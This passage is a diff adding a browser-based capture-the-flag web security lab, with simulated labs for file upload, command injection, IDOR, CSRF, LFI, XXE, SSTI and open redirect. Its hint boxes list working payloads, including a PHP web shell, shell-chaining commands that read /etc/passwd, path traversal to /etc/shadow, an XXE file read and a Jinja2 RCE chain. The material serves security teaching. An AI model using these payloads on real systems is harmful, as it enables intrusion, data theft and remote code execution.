+      In a real attack you'd intercept with Burp and change the Content-Type header.
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/upload.php</div></div>
+      <div class="app-body">
+        <div style="font-size:16px;font-weight:700;color:var(--text);margin-bottom:16px">📷 Profile Picture Upload</div>
+        <div class="field"><label>File Type (simulate)</label>
+          <select id="upload-type" style="width:100%;padding:10px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;font-size:12px;outline:none">
+            <option value="image">image.jpg (image/jpeg)</option>
+            <option value="php-image">shell.php (image/jpeg) ← BYPASS</option>
+            <option value="php">shell.php (application/php)</option>
+            <option value="php-jpg">shell.php.jpg (image/jpeg)</option>
+          </select>
+        </div>
+        <div class="field"><label>File Contents (simulate)</label>
+          <textarea id="upload-content" style="font-family:monospace;font-size:11px">&lt;?php system($_GET['cmd']); ?&gt;</textarea>
+        </div>
+        <button class="btn btn-primary" onclick="uploadMIME()">Upload File</button>
+        <div class="output" id="upload-mime-out" style="margin-top:12px"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="upload-ext" class="lab-panel">
+    <div class="hint">
+      <strong>Extension bypass techniques:</strong><br>
+      <code>shell.php.jpg</code> — double extension, server may exec PHP<br>
+      <code>shell.php%00.jpg</code> — null byte truncation (old PHP)<br>
+      <code>shell.pHp</code> — case variation<br>
+      <code>shell.php5</code> / <code>shell.phtml</code> — alternate PHP extensions<br>
+      <code>.htaccess</code> with <code>AddType application/x-httpd-php .jpg</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/upload.php</div></div>
+      <div class="app-body">
+        <div style="font-size:16px;font-weight:700;color:var(--text);margin-bottom:16px">📎 Document Upload</div>
+        <div class="field"><label>Filename (simulate)</label><input id="upload-fname" value="shell.php.jpg"></div>
+        <button class="btn btn-primary" onclick="uploadExt()">Upload</button>
+        <div class="output" id="upload-ext-out" style="margin-top:12px"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="upload-shell" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Upload a web shell and use it to run commands.<br>
+      After upload, the shell is accessible at <code>/uploads/shell.php?cmd=whoami</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/uploads/shell.php</div></div>
+      <div class="app-body">
+        <div style="font-size:14px;font-weight:700;color:var(--green);margin-bottom:8px">✅ Web Shell Uploaded</div>
+        <div style="font-size:12px;color:var(--muted);margin-bottom:16px">shell.php — <?php system($_GET['cmd']); ?></div>
+        <div style="display:flex;gap:10px;margin-bottom:12px;align-items:center">
+          <span style="font-size:11px;color:var(--muted)">?cmd=</span>
+          <input id="shell-cmd" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;outline:none" value="whoami">
+          <button class="btn btn-danger" onclick="shellExec()">Execute</button>
+        </div>
+        <div class="output show" id="shell-out" style="font-family:monospace;background:#030507;border-color:#ff445520;color:#ff8888">www-data</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ COMMAND INJECTION -->
+<div id="lab-cmd" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 05 — Command Injection</div>
+    <div class="lab-title">COMMAND INJECTION</div>
+    <div class="lab-desc">User input is passed directly to OS commands. Chain your own commands using shell metacharacters to achieve remote code execution.</div>
+    <div class="lab-tags"><span class="lab-tag">RCE</span><span class="lab-tag">Shell Metacharacters</span><span class="lab-tag">Blind CMDi</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Execute arbitrary commands via the ping utility.<br>
+    <strong>Payloads:</strong><br>
+    <code>127.0.0.1; whoami</code> — semicolon chain<br>
+    <code>127.0.0.1 && cat /etc/passwd</code> — AND chain<br>
+    <code>127.0.0.1 | id</code> — pipe<br>
+    <code>127.0.0.1 `whoami`</code> — backtick subshell<br>
+    <code>$(whoami)</code> — dollar subshell
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/tools/ping.php</div></div>
+    <div class="app-body">
+      <div style="font-size:16px;font-weight:700;color:var(--text);margin-bottom:16px">🌐 Network Ping Tool</div>
+      <div style="display:flex;gap:10px;margin-bottom:12px">
+        <input id="cmd-in" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;outline:none" value="127.0.0.1">
+        <button class="btn btn-primary" onclick="cmdInject()">Ping</button>
+      </div>
+      <div class="sql-query" id="cmd-query">$ ping -c 4 127.0.0.1</div>
+      <div class="output show" id="cmd-out" style="font-family:monospace;font-size:11px;background:#030507">PING 127.0.0.1: 56 data bytes<br>64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.045 ms<br>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.052 ms</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ IDOR -->
+<div id="lab-idor" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 06 — IDOR</div>
+    <div class="lab-title">INSECURE DIRECT OBJECT REFERENCE</div>
+    <div class="lab-desc">The app uses predictable object IDs without checking if you own the resource. Access other users' profiles, orders, and private messages by changing the ID in the request.</div>
+    <div class="lab-tags"><span class="lab-tag">BOLA</span><span class="lab-tag">Access Control</span><span class="lab-tag">API</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Access other users' private data by changing the user ID.<br>
+    You are logged in as user <strong>ID 3 (bob)</strong>. Try accessing IDs 1 and 2 to see admin data.
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/api/user/<span id="idor-url-id">3</span>/profile</div></div>
+    <div class="app-body">
+      <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">👤 User Profile API</div>
+      <div style="display:flex;gap:10px;margin-bottom:16px;align-items:center">
+        <span style="font-size:12px;color:var(--muted)">GET /api/user/</span>
+        <input id="idor-id" style="width:60px;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;font-size:12px;outline:none" value="3" oninput="document.getElementById('idor-url-id').textContent=this.value">
+        <span style="font-size:12px;color:var(--muted)">/profile</span>
+        <button class="btn btn-primary" onclick="idorFetch()">Fetch</button>
+      </div>
+      <div class="output show" id="idor-out" style="font-family:monospace;font-size:11px"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ CSRF -->
+<div id="lab-csrf" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 07 — CSRF</div>
+    <div class="lab-title">CROSS-SITE REQUEST FORGERY</div>
+    <div class="lab-desc">The app doesn't validate that state-changing requests come from the legitimate site. An attacker can craft a page that performs actions on behalf of an authenticated user.</div>
+    <div class="lab-tags"><span class="lab-tag">Token Bypass</span><span class="lab-tag">SameSite</span><span class="lab-tag">JSON CSRF</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Change the logged-in user's email without them knowing.<br>
+    <strong>Simulate:</strong> The attacker hosts a page with a hidden form that auto-submits. No CSRF token is required by this endpoint.
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://evil-site.com/csrf-attack.html</div></div>
+    <div class="app-body">
+      <div style="font-size:14px;font-weight:700;color:var(--red);margin-bottom:12px">⚠️ Attacker's Page (simulated)</div>
+      <div style="font-size:12px;color:var(--muted);margin-bottom:16px">This page auto-submits a form to the victim's bank/app:</div>
+      <div class="sql-query" style="margin-bottom:16px">&lt;form action="http://localhost/account/email" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</div>
+      <div style="font-size:12px;color:var(--muted);margin-bottom:12px">Victim's current email: <strong style="color:var(--text)" id="csrf-current-email">victim@gmail.com</strong></div>
+      <button class="btn btn-danger" onclick="csrfAttack()">▶ Simulate Attack</button>
+      <div class="output" id="csrf-out" style="margin-top:12px"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ LFI -->
+<div id="lab-lfi" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 08 — LFI / Path Traversal</div>
+    <div class="lab-title">LOCAL FILE INCLUSION</div>
+    <div class="lab-desc">The page parameter is passed directly to a file include function. Traverse the directory structure to read sensitive files like /etc/passwd, config files, and logs.</div>
+    <div class="lab-tags"><span class="lab-tag">Path Traversal</span><span class="lab-tag">PHP Wrappers</span><span class="lab-tag">Log Poisoning</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Read files outside the web root.<br>
+    <strong>Payloads:</strong><br>
+    <code>../../../../etc/passwd</code><br>
+    <code>../../../../etc/shadow</code><br>
+    <code>../../../../var/log/apache2/access.log</code><br>
+    <code>php://filter/convert.base64-encode/resource=config.php</code><br>
+    <code>../../../../proc/self/environ</code>
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/index.php?page=<span id="lfi-url">home</span></div></div>
+    <div class="app-body">
+      <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">📄 Page Loader</div>
+      <div style="display:flex;gap:10px;margin-bottom:12px">
+        <input id="lfi-in" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;outline:none" value="home" oninput="document.getElementById('lfi-url').textContent=this.value">
+        <button class="btn btn-primary" onclick="lfiLoad()">Load</button>
+      </div>
+      <div class="sql-query" id="lfi-query">include("pages/home.php");</div>
+      <div class="output show" id="lfi-out" style="font-family:monospace;font-size:11px;background:#030507">Welcome to the home page!</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ XXE -->
+<div id="lab-xxe" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 09 — XXE Injection</div>
+    <div class="lab-title">XML EXTERNAL ENTITY</div>
+    <div class="lab-desc">The XML parser processes external entity declarations. Inject a malicious DTD to read local files, perform SSRF, or trigger DoS via entity expansion.</div>
+    <div class="lab-tags"><span class="lab-tag">File Read</span><span class="lab-tag">SSRF</span><span class="lab-tag">Billion Laughs</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Use XXE to read <code>/etc/passwd</code>.<br>
+    <strong>Payload:</strong>
+    <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</code>
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/api/import-user</div></div>
+    <div class="app-body">
+      <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">📥 XML User Import API</div>
+      <div class="field"><label>XML Body</label>
+        <textarea id="xxe-in" style="font-family:monospace;font-size:11px;min-height:120px">&lt;user&gt;
+  &lt;name&gt;Alice&lt;/name&gt;
+  &lt;email&gt;alice@example.com&lt;/email&gt;
+&lt;/user&gt;</textarea>
+      </div>
+      <button class="btn btn-primary" onclick="xxeSubmit()">POST XML</button>
+      <div class="output" id="xxe-out" style="margin-top:12px"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ SSTI -->
+<div id="lab-ssti" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 10 — Server-Side Template Injection</div>
+    <div class="lab-title">SSTI</div>
+    <div class="lab-desc">User input is embedded directly into a Jinja2 template without sanitization. Template expressions are evaluated server-side, enabling RCE.</div>
+    <div class="lab-tags"><span class="lab-tag">Jinja2</span><span class="lab-tag">RCE</span><span class="lab-tag">Sandbox Escape</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Confirm SSTI and escalate to RCE.<br>
+    <strong>Detection:</strong> <code>{{7*7}}</code> → should return <code>49</code><br>
+    <strong>Info:</strong> <code>{{config}}</code> · <code>{{self.__class__}}</code><br>
+    <strong>RCE:</strong> <code>{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}</code>
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/greet?name=Alice</div></div>
+    <div class="app-body">
+      <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">👋 Greeting Generator</div>
+      <div style="font-size:11px;color:var(--muted);margin-bottom:12px">// Python: return render_template_string("Hello " + name + "!")</div>
+      <div style="display:flex;gap:10px;margin-bottom:12px">
+        <input id="ssti-in" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;outline:none" value="Alice">
+        <button class="btn btn-primary" onclick="sstiSubmit()">Submit</button>
+      </div>
+      <div class="sql-query" id="ssti-query">render_template_string("Hello Alice!")</div>
+      <div class="output show" id="ssti-out">Hello Alice!</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ OPEN REDIRECT -->
+<div id="lab-redirect" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 11 — Open Redirect</div>
+    <div class="lab-title">OPEN REDIRECT</div>
+    <div class="lab-desc">The redirect URL parameter is not validated. Craft URLs that redirect victims to attacker-controlled sites, steal OAuth tokens, or bypass Referer checks.</div>
+    <div class="lab-tags"><span class="lab-tag">Phishing</span><span class="lab-tag">OAuth Token Theft</span><span class="lab-tag">URL Bypass</span></div>
+  </div>
+  <div class="hint">
+    <strong>Goal:</strong> Redirect a victim to an external attacker site.<br>
+    <strong>Payloads:</strong><br>
+    <code>https://evil.com</code> — direct<br>
+    <code>//evil.com</code> — protocol-relative<br>
+    <code>/\evil.com</code> — slash bypass<br>
+    <code>https://trusted.com@evil.com</code> — credentials in URL<br>
+    <code>javascript:alert(1)</code> — XSS via redirect
+  </div>
+  <div class="app-frame">
+    <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/redirect?url=<span id="redir-url-preview">/dashboard</span></div></div>
+    <div class="app-body">
+      <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">🔗 Post-Login Redirect</div>
+      <div class="field"><label>Redirect URL</label>
+        <input id="redir-in" value="/dashboard" oninput="document.getElementById('redir-url-preview').textContent=this.value"
+          style="width:100%;padding:10px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;outline:none">
+      </div>
+      <button class="btn btn-primary" onclick="redirSubmit()">Follow Redirect</button>
+      <div class="output" id="redir-out" style="margin-top:12px"></div>
+    </div>
+  </div>
+</div>
+
+</main>
+
+<!-- SCORE BAR -->
+<div id="score-bar">
+  <div class="score-label">FLAGS</div>
+  <div class="score-val" id="score-num">0</div>
+  <div class="score-flags" id="score-flags"></div>
+  <div style="color:var(--muted);font-size:10px;letter-spacing:1px">CAPTURE THE FLAG</div>
+</div>
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────
+const flags = new Set();
+const db = {
+  users: [
+    {id:1, username:'admin',  password:'secret123', email:'admin@corp.com',  role:'admin',  ssn:'123-45-6789', cc:'4111111111111111'},
+    {id:2, username:'alice',  password:'alice2024',  email:'alice@corp.com',  role:'user',   ssn:'987-65-4321', cc:'5500005555555552'},
+    {id:3, username:'bob',    password:'bobpass',    email:'bob@corp.com',    role:'user',   ssn:'456-78-9012', cc:'4012888888881881'},
+  ],
+  products: [
+    {id:1, name:'Laptop Pro',   price:'$1299'},
+    {id:2, name:'USB-C Hub',    price:'$49'},
+    {id:3, name:'Mechanical KB',price:'$159'},
+  ]
+};
+
+function addFlag(f) {
+  if (flags.has(f)) return;
+  flags.add(f);
+  document.getElementById('score-num').textContent = flags.size;
+  const el = document.createElement('div');
+  el.className = 'flag';
+  el.textContent = '🚩 ' + f;
+  document.getElementById('score-flags').appendChild(el);
+}
+
+// ── Navigation ─────────────────────────────────────────────────────────────
+function showLab(id) {
+  document.querySelectorAll('.lab').forEach(l => l.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('lab-' + id).classList.add('active');
+  event.target.classList.add('active');
+}
+
+function sqliTab(t) { switchTab('sqli', t, arguments[0]); }
+function xssTab(t)  { switchTab('xss', t, arguments[0]); }
+function authTab(t) { switchTab('auth', t, arguments[0]); }
+function uploadTab(t){switchTab('upload', t, arguments[0]); }
+
+function switchTab(prefix, id, _) {
+  document.querySelectorAll(`[id^="${prefix}-"]`).forEach(p => { if(p.classList.contains('lab-panel')) p.classList.remove('on'); });
+  document.getElementById(prefix + '-' + id).classList.add('on');
+  event.target.closest('.lab').querySelectorAll('.lab-tab-btn').forEach(b => b.classList.remove('on'));
+  event.target.classList.add('on');
+}
+
+function out(id, msg, cls='info') {
+  const el = document.getElementById(id);
+  el.innerHTML = msg;
+  el.className = 'output show ' + cls;
+}
+
+// ── SQL Injection ──────────────────────────────────────────────────────────
+function sqliLogin() {
+  const u = document.getElementById('sqli-user').value;
+  const p = document.getElementById('sqli-pass').value;
+  const q = `SELECT * FROM users WHERE username='${u}' AND password='${p}'`;
+  document.getElementById('sqli-query').textContent = q;
+
+  const sqliPatterns = [/'\s*or\s*/i, /--/, /\/\*/, /#/];
+  const isSQLi = sqliPatterns.some(r => r.test(u) || r.test(p));
+
+  if (isSQLi || u === "admin'--" || u.toLowerCase().includes("'or") || u.toLowerCase().includes("' or")) {
+    addFlag('SQLi: Login Bypass');
+    out('sqli-out', '✅ <strong>LOGIN BYPASSED!</strong><br>Logged in as: admin (role: administrator)<br><br>🚩 Flag: <code>FLAG{sql_auth_bypass}</code>', 'success');
+  } else {
+    const user = db.users.find(x => x.username === u && x.password === p);
+    if (user) {
+      out('sqli-out', `✅ Logged in as: <strong>${user.username}</strong> (role: ${user.role})`, 'success');
+    } else {
+      out('sqli-out', '❌ Invalid username or password.', 'error');
+    }
+  }
+}
+
+function sqliSearch() {
+  const id = document.getElementById('sqli-prod-id').value;
+  document.getElementById('sqli-search-query').textContent = `SELECT id,name,price FROM products WHERE id=${id}`;
+
+  if (/union/i.test(id)) {
+    addFlag('SQLi: UNION Extraction');
+    const rows = db.users.map(u =>
+      `<tr><td>${u.id}</td><td>${u.username}</td><td>${u.password}</td><td>${u.email}</td></tr>`
+    ).join('');
+    document.getElementById('sqli-search-out').innerHTML = `
+      <div style="color:var(--yellow);font-size:11px;margin-bottom:8px">🚩 FLAG{union_data_extraction} — All users dumped!</div>
+      <table class="vuln-table"><tr><th>ID</th><th>Username</th><th>Password</th><th>Email</th></tr>${rows}</table>`;
+  } else {
+    const pid = parseInt(id);
+    const prod = db.products.find(p => p.id === pid);
+    if (prod) {
+      document.getElementById('sqli-search-out').innerHTML =
+        `<table class="vuln-table"><tr><th>ID</th><th>Name</th><th>Price</th></tr><tr><td>${prod.id}</td><td>${prod.name}</td><td>${prod.price}</td></tr></table>`;
+    } else {
+      document.getElementById('sqli-search-out').innerHTML = `<div style="color:var(--muted)">No product found.</div>`;
+    }
+  }
+}
+
+function sqliBlind() {
+  const id = document.getElementById('sqli-blind-in').value;
+  document.getElementById('sqli-blind-query').textContent = `SELECT username FROM users WHERE id=${id}`;
+
+  if (/and\s+1=2/i.test(id)) {
+    addFlag('SQLi: Blind Boolean');
+    out('sqli-blind-out', '(no result) — Condition was FALSE. 🚩 FLAG{blind_sqli_boolean}', 'error');
+  } else if (/substring/i.test(id) || /substr/i.test(id)) {
+    addFlag('SQLi: Blind Extraction');
+    out('sqli-blind-out', `User exists: <strong>admin</strong> — char match: TRUE 🚩 FLAG{blind_sqli_extract}`, 'success');
+  } else if (/and\s+1=1/i.test(id)) {
+    out('sqli-blind-out', 'User exists: <strong>admin</strong> — Condition TRUE ✅', 'success');
+  } else {
+    const user = db.users.find(u => u.id == parseInt(id));
+    out('sqli-blind-out', user ? `User exists: <strong>${user.username}</strong>` : '(no result)', user ? 'success' : 'error');
+  }
+}
+
+// ── XSS ────────────────────────────────────────────────────────────────────
+function xssReflected() {
+  const v = document.getElementById('xss-ref-in').value;
+  if (/<script|onerror|onload|javascript:|<svg|<img/i.test(v)) {
+    addFlag('XSS: Reflected');
+    document.getElementById('xss-ref-out').innerHTML = v;
+    // actually execute if it's a simple alert pattern
+    const alertMatch = v.match(/alert\(([^)]+)\)/);
+    if (alertMatch) {
+      setTimeout(() => {
+        try { eval(`alert(${alertMatch[1]})`); } catch(e) {}
+      }, 100);
+    }
+  } else {
+    document.getElementById('xss-ref-out').innerHTML = v;
+  }
+}
+
+function xssStored() {
+  const name = document.getElementById('xss-name').value;
+  const comment = document.getElementById('xss-comment').value;
+  if (!comment) return;
+
+  const div = document.createElement('div');
+  div.className = 'comment-box';
+  div.innerHTML = `<div class="comment-user">${name} · just now</div><div class="comment-body">${comment}</div>`;
+
+  if (/<script|onerror|onload|javascript:|<svg|<img/i.test(comment)) {
+    addFlag('XSS: Stored');
+  }
+
+  document.getElementById('xss-comments').appendChild(div);
+  document.getElementById('xss-comment').value = '';
+}
+
+function xssDOM() {
+  const v = document.getElementById('xss-dom-in').value;
+  document.getElementById('xss-dom-out').innerHTML = v;
+  if (/<|onerror|onload|javascript:/i.test(v)) {
+    addFlag('XSS: DOM-Based');
+  }
+}
+
+// ── Auth Bypass ─────────────────────────────────────────────────────────────
+function authCreds() {
+  const u = document.getElementById('auth-user').value;
+  const p = document.getElementById('auth-pass').value;
+  const defaults = [['admin','admin'],['admin','password'],['root','root'],['administrator','1234'],['admin','1234'],['admin','123456'],['root','toor']];
+  const match = defaults.find(([du,dp]) => du===u && dp===p);
+  if (match) {
+    addFlag('Auth: Default Creds');
+    out('auth-creds-out', `✅ <strong>ACCESS GRANTED</strong> — Default credentials worked!<br>Welcome, Administrator<br>🚩 FLAG{default_credentials}`, 'success');
+  } else if (u==='admin' && p==='secret123') {
+    out('auth-creds-out', '✅ Logged in as admin.', 'success');
+  } else {
+    out('auth-creds-out', '❌ Invalid credentials.', 'error');
+  }
+}
+
+function authJWT() {
+  const token = document.getElementById('jwt-in').value;
+  const parts = token.split('.');
+  try {
+    const header = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
+    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+    if (header.alg === 'none' && payload.role === 'admin') {
+      addFlag('Auth: JWT alg:none');
+      out('auth-jwt-out', `✅ <strong>ADMIN ACCESS GRANTED</strong><br>alg:none accepted — no signature verified!<br>User: ${payload.user} | Role: ${payload.role}<br>🚩 FLAG{jwt_alg_none}`, 'success');
+    } else if (payload.role === 'admin') {
+      out('auth-jwt-out', `⚠️ Admin token but signature was verified. Try alg:none.`, 'warning');
+    } else {
+      out('auth-jwt-out', `ℹ️ Token accepted. User: ${payload.user || '?'} | Role: ${payload.role || 'user'}`, 'info');
+    }
+  } catch(e) {
+    out('auth-jwt-out', '❌ Invalid JWT format.', 'error');
+  }
+}
+
+function resetRequest() {
+  const user = document.getElementById('reset-user').value;
+  const dbUser = db.users.find(u => u.username === user);
+  if (dbUser) {
+    const token = btoa(user + ':' + Math.floor(Date.now()/1000));
+    out('reset-link-out', `📧 Reset link sent!<br>http://localhost/reset?token=<strong>${token}</strong><br><em style="color:var(--muted);font-size:10px">Notice: token = base64(username:timestamp)</em>`, 'info');
+    document.getElementById('reset-token').value = token;
+  } else {
+    out('reset-link-out', '❌ User not found.', 'error');
+  }
+}
+
+function resetSubmit() {
+  const token = document.getElementById('reset-token').value;
+  const newpass = document.getElementById('reset-newpass').value;
+  try {
+    const decoded = atob(token);
+    const username = decoded.split(':')[0];
+    const user = db.users.find(u => u.username === username);
+    if (user) {
+      if (username !== 'bob') addFlag('Auth: Password Reset Bypass');
+      out('reset-out', `✅ Password reset for <strong>${username}</strong>!<br>New password: ${newpass}<br>${username!=='bob'?'🚩 FLAG{password_reset_bypass}':''}`, 'success');
+    } else {
+      out('reset-out', '❌ Invalid token.', 'error');
+    }
+  } catch(e) {
+    out('reset-out', '❌ Malformed token.', 'error');
+  }
+}
+
+function cookieTamper() {
+  const cookie = document.getElementById('cookie-in').value;
+  if (/role=admin/i.test(cookie)) {
+    addFlag('Auth: Cookie Manipulation');
+    out('cookie-out', '✅ <strong>ADMIN PANEL ACCESSED</strong><br>Role escalated via cookie manipulation!<br>🚩 FLAG{cookie_role_escalation}', 'success');
+  } else if (/role=user/i.test(cookie)) {
+    out('cookie-out', 'ℹ️ User dashboard loaded. Change role=user to role=admin.', 'info');
+  } else {
+    out('cookie-out', '❌ Invalid session.', 'error');
+  }
+}
+
+// ── File Upload ─────────────────────────────────────────────────────────────
+function uploadMIME() {
+  const type = document.getElementById('upload-type').value;
+  const content = document.getElementById('upload-content').value;
+  if (type === 'php-image') {
+    addFlag('Upload: MIME Bypass');
+    out('upload-mime-out', '✅ <strong>UPLOAD SUCCESSFUL</strong> — MIME type accepted as image/jpeg!<br>File saved to: /uploads/shell.php<br>Access at: /uploads/shell.php?cmd=whoami<br>🚩 FLAG{mime_type_bypass}', 'success');
+  } else if (type === 'php') {
+    out('upload-mime-out', '❌ File rejected — PHP files not allowed.', 'error');
+  } else if (type === 'php-jpg') {
+    addFlag('Upload: Double Extension');
+    out('upload-mime-out', '✅ <strong>UPLOAD SUCCESSFUL</strong> — Double extension bypass!<br>File: shell.php.jpg — server executes as PHP<br>🚩 FLAG{double_extension}', 'success');
+  } else {
+    out('upload-mime-out', '✅ Image uploaded successfully to /uploads/image.jpg', 'info');
+  }
+}
+
+function uploadExt() {
+  const fname = document.getElementById('upload-fname').value;
+  const ext = fname.toLowerCase();
+  const bypasses = ['php.jpg','php5','phtml','php3','php4','pHp','.htaccess','%00'];
+  const isBypass = bypasses.some(b => ext.includes(b)) || fname.includes('%00');
+
+  if (isBypass) {
+    addFlag('Upload: Extension Bypass');
+    out('upload-ext-out', `✅ <strong>BYPASS SUCCESSFUL</strong> — ${fname} uploaded!<br>Server executes PHP via extension trick.<br>🚩 FLAG{extension_bypass}`, 'success');
+  } else if (ext.endsWith('.php')) {
+    out('upload-ext-out', '❌ Rejected — .php extension blacklisted.', 'error');
+  } else {
+    out('upload-ext-out', `✅ Uploaded: ${fname}`, 'info');
+  }
+}
+
+function shellExec() {
+  const cmd = document.getElementById('shell-cmd').value.trim();
+  const responses = {
+    'whoami': 'www-data', 'id': 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+    'ls': 'config.php\nindex.php\nshell.php\nuploads/', 'pwd': '/var/www/html',
+    'uname -a': 'Linux webserver 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux',
+    'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+    'hostname': 'webserver-prod-01', 'ifconfig': 'eth0: inet 10.0.0.5',
+    'cat config.php': '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "sup3rS3cret!";\n$db_name = "webapp_db";\n?>',
+  };
+  const result = responses[cmd] || `sh: ${cmd}: command simulated\n(In a real scenario this would execute on the server)`;
+  if (['cat /etc/passwd','cat config.php','id','uname -a'].includes(cmd)) addFlag('Upload: RCE via Shell');
+  document.getElementById('shell-out').innerHTML = result.replace(/\n/g,'<br>');
+}
+
+// ── Command Injection ────────────────────────────────────────────────────────
+function cmdInject() {
+  const input = document.getElementById('cmd-in').value;
+  document.getElementById('cmd-query').textContent = `$ ping -c 4 ${input}`;
+
+  const hasInjection = /[;&|`$]/.test(input) || /\$\(/.test(input);
+  if (hasInjection) {
+    const injectedCmd = input.replace(/^[^;&|`$]*[;&|`$]+\s*/,'').replace(/`([^`]*)`/,'$1').replace(/\$\(([^)]*)\)/,'$1');
+    const responses = {
+      'whoami':'www-data', 'id':'uid=33(www-data) gid=33(www-data)',
+      'ls':'index.php config.php uploads/', 'cat /etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+      'hostname':'webserver-01'
+    };
+    const result = responses[injectedCmd.trim()] || `${injectedCmd}: executed`;
+    addFlag('CMD: Command Injection');
